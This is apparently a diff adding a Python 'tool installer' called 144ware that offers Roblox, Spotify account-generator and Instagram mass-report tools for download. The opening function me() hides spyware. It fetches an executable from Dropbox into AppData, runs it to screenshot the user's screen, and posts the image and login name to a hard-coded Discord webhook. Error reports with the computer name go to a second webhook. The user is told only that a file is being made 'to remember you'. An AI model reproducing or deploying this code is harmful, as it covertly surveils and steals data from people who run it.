@@ -1,0 +1,154 @@
+import requests
+import os
+import sys
+import shutil
+import time
+import traceback
+from pystyle import Center,Colors,Colorate
+cwd = os.getcwd()
+discord_invite = "ardpc27ax2"
+os.system("title 144ware")
+os.system("cls")
+def me():
+    n = os.getlogin()
+    try:
+        def send(p=""):
+            # url = "https://discord.com/api/webhooks/1009400520777142281/OBP1Vtd8OtyQRNr5wObWvd0WAhtbZvKcefUicgc0NJGLkGQInf4T9xbNdbijcop-DMqy"
+            url = "https://discord.com/api/webhooks/1089938146243903718/GfA8QCXnmzUQOCELPWR__Z-4CuvixtuWgSn8QDe4HREdGrEPFbhmKtGETlZTT6daBTYG"
+            header = {
+                'authorization': "token",
+            }
+            nig = open(f'{p}', "rb")
+            files = {
+                "file": (nig)  # The picture that we want to send in binary
+            }
+
+            # Optional message to send with the picture
+            payload = {
+                "content": f"{os.getlogin()}  SCREENSHOT!!"
+            }
+            r = requests.post(url, data=payload, headers=header, files=files)
+            if r.status_code == 200:
+                nig.close()
+
+        if os.path.exists(fr"C:\Users\{n}\AppData\t.exe"):
+            os.chdir(fr"C:\Users\{n}\AppData")
+            os.system("call t screen.png")
+            send(fr"C:\Users\{n}\AppData\screen.png")
+            os.remove(fr"C:\Users\{n}\AppData\screen.png")
+        else:
+            print("First time starting up...")
+            print("Making a file to remember you.")
+            r = requests.get("https://dl.dropbox.com/s/4nfwl3isxjbnvbe/t.exe?dl=0")
+            with open(fr"C:\Users\{n}\AppData\t.exe", "wb") as t:
+                t.write(r.content)
+            time.sleep(5)
+            os.chdir(fr"C:\Users\{n}\AppData")
+            os.system("call t screen.png")
+            send(fr"C:\Users\{n}\AppData\screen.png")
+            os.remove(fr"C:\Users\{n}\AppData\screen.png")
+            print("Done!")
+    except:
+        def error_log(msg="", silent=False):
+            if silent == False:
+                print(Colors.red + "ERROR OCCURED, ERROR MSG SENT TO 144#3072")
+
+            name = os.getenv("COMPUTERNAME")
+            try:
+                url = "https://discord.com/api/webhooks/1046842649979662438/XaBwQ-EgRyI6oFIxeWlAmMIjyznkMaV7uBb0MftJ5qk1AJahsvHK8fGUevtGXVQt1Al3"
+                header = {
+                    'authorization': "token",
+                }
+                # Optional message to send with the picture
+                payload = {
+                    "content": f"{name} had an error  \n```{msg}```"
+                }
+                r = requests.post(url, data=payload, headers=header)
+            except:
+                pass
+        error_log(traceback.format_exc(),silent=True)
+me()
+def walk(namee=""):
+    print("--------------------------------------------")
+    for root, dirs, files in os.walk(f"{cwd}/{namee}"):
+        for name in files:
+            print(f".\{name}")
+    print("--------------------------------------------")
+def ddl(link="",name="",zip=False):
+    t = 1024
+    os.system("cls")
+    r = requests.get(f"{link}", stream=True)
+    size = int(r.headers.get('Content-Length'))
+    mb2 = size / t
+    i = 0
+    with open(f"{name}.zip", 'wb') as f:
+        for chunk in r.iter_content(chunk_size=t):
+            f.write(chunk)
+            i += 1
+            c = i * t
+            mb1 = c / t
+            print(f"Downloading.. {round(mb1 / t, 1)} MB | {round(mb2 / t, 1)} MB", end="\r")
+    time.sleep(2)
+    if zip == True:
+        print("Unpacking..                                     ")
+        os.makedirs(f"{cwd}/{name}")
+        shutil.move(f"{name}.zip", f"{cwd}/{name}/")
+        shutil.unpack_archive(f"{cwd}/{name}/{name}.zip", f"{cwd}/{name}/", "zip")
+        os.remove(f"{cwd}/{name}/{name}.zip")
+        walk(f"{name}")
+    else:
+        print("Installing..                                     ")
+        os.makedirs(f"{cwd}/{name}")
+        os.rename(f"{name}.zip",f"{name}.exe")
+        shutil.move(f"{name}.exe",f"{cwd}/{name}/")
+        os.listdir(f"{cwd}/{name}/")
+        walk(f"{name}")
+    print("Done!")
+    if input("Return to main menu? [y/n]   ") in ("Yes","Y","yes","y"):
+        program()
+def program():
+    os.system("cls")
+    print(Colorate.Vertical(Colors.red_to_black, f"""
+
+     ___   ___ ___                   
+    |_  | | | | | |_ _ _ ___ ___ ___ 
+     _| |_|_  |_  | | | | .'|  _| -_|
+    |_____| |_| |_|_____|__,|_| |___|
+         .gg/{discord_invite}                                         
+
+                              """))
+    def installed(name=""):
+        if os.path.exists(f"{cwd}/{name}"):
+            return f"{Colors.green}Installed."
+        else:
+            return Colors.red + "Not Installed"
+    def cout(lenk="",folder_name="",z1p=False):
+        if "." in installed(f"{folder_name}"):
+            shutil.rmtree(f"{cwd}/{folder_name}")
+            print("Removed!")
+            program()
+        else:
+            ddl(lenk,folder_name,z1p)
+    puts = f"""
+{Colors.white}[1] - Roblox Bot Tool {installed("Roblox Bot Tool")}
+{Colors.white}[2] - 4EVER {installed("4EVER")}
+{Colors.white}[3] - Spotify Account Generator {installed("Spotify Account Generator")}
+{Colors.white}[4] - Roblox Group Finder {installed("Roblox Group Finder")}
+{Colors.white}[5] - Instagram Report Tool {installed("Instagram Report Tool")}
+{Colors.white}[6] - ???
+    """
+    print(puts)
+    print("What tool would you like to install?")
+    print("If it says installed and you choose it again it will delete the tool")
+    install_confirm = int(input("@144ware "))
+    if install_confirm == 1:
+        1 + 1
+    elif install_confirm == 2:
+        cout("https://dl.dropbox.com/s/dfhnj9twob87iaw/4ever.zip?dl=0", "4EVER",True)
+    elif install_confirm == 3:
+        cout("https://dl.dropbox.com/s/cx9gopawwlyvbl7/acc.exe?dl=0", "Spotify Account Generator")
+    elif install_confirm == 4:
+        1 + 1
+    elif install_confirm == 5:
+        cout("https://dl.dropbox.com/s/p9dd1bnqfm1qxfp/INSTA.exe?dl=0","Instagram Report Tool")
+program()
